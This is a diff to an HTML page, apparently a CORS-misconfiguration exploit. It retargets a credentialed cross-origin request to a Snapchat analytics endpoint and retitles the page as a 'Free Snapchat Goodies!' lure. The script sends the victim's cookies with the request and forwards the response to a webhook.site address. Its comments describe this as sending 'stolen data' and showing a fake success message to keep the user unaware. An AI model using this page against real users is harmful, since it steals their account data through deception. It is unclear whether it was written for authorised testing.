@@ -2,20 +2,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Malicious Script</title>
+  <title>Free Snapchat Goodies!</title>
 </head>
 <body>
-  <h1>Claim Your Free Offer!</h1>
+  <h1>Click for Free Snapchat Goodies!</h1>
   <script>
     var req = new XMLHttpRequest();
     req.onload = reqListener;
-    req.open('POST', 'https://api.marionnaud.sk/api/v2/msk-spa/cms/components?fields=DEFAULT&currentPage=0&pageSize=2&componentIds=loginLink%2CRegisterLink&lang=sk_SK&curr=EUR', true);
-    req.withCredentials = true; // Send cookies with the request
-    req.send();
+    req.open('POST', 'https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', true);
+    req.withCredentials = true; // Send cookies
+    req.setRequestHeader('Content-Type', 'application/json; charset=UTF-8');
+    req.send('{}'); // Dummy JSON body
     
     function reqListener() {
-      // Exfiltrate sensitive data to an external server
-      location = 'https://webhook.site/b0ef671b-3d52-4098-b811-ca106b19c853?data=' + encodeURIComponent(this.responseText);
+      // Send stolen data to your webhook
+      var exfil = new XMLHttpRequest();
+      exfil.open('GET', 'https://webhook.site/4257e232-4c50-4d50-80de-5e92e6d8d7e3?data=' + encodeURIComponent(this.responseText), true);
+      exfil.send();
+      // Optional: Show fake success to keep the user happy
+      document.body.innerHTML += '<p>Success! Check your Snapchat!</p>';
     }
   </script>
 </body>
